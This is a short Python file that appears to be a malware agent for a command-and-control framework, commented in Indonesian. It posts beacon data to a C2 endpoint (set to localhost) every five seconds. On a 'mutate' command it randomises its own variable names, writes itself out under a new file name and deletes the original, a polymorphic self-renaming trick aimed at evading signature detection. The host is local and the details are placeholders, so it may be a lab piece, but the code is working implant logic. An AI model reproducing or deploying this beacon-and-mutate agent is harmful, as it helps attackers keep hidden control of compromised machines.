# agents/orb-mutator.py
import requests
import uuid
import time
import os
import random
import string

# === CONFIG ===
C2 = "http://localhost:8000"
AGENT_ID = "mutator_" + uuid.uuid4().hex[:8]
ALPHABET = string.ascii_letters

# === MUTATE SELF ===
def mutate_code():
    # Baca file ini
    with open(__file__, "r") as f:
        code = f.read()

    # Ubah nama variabel acak
    lines = code.splitlines()
    new_lines = []
    for line in lines:
        if "=" in line and not line.startswith("#") and "import" not in line:
            var = line.split("=")[0].strip()
            if len(var) > 1 and var.isalnum():
                new_var = ''.join(random.choices(ALPHABET, k=len(var)))
                code = code.replace(var, new_var)

    # Simpan sebagai file baru
    new_file = f"orb_agent_{uuid.uuid4().hex[:6]}.py"
    with open(new_file, "w") as f:
        f.write(code)

    # Hapus file lama
    os.remove(__file__)
    print(f"[MUTATE] New agent: {new_file}")
    os._exit(0)

# === BEACON LOOP ===
while True:
    try:
        data = {
            "agent_id": AGENT_ID,
            "ip": "127.0.0.1",
            "os": "MutatingOS",
            "hostname": "neural-" + AGENT_ID[:6],
            "last_seen": time.time()
        }
        r = requests.post(f"{C2}/api/beacon", json=data)
        task = r.json().get("task")

        if task and task["command"] == "mutate":
            mutate_code()

        time.sleep(5)
    except Exception as e:
        time.sleep(10)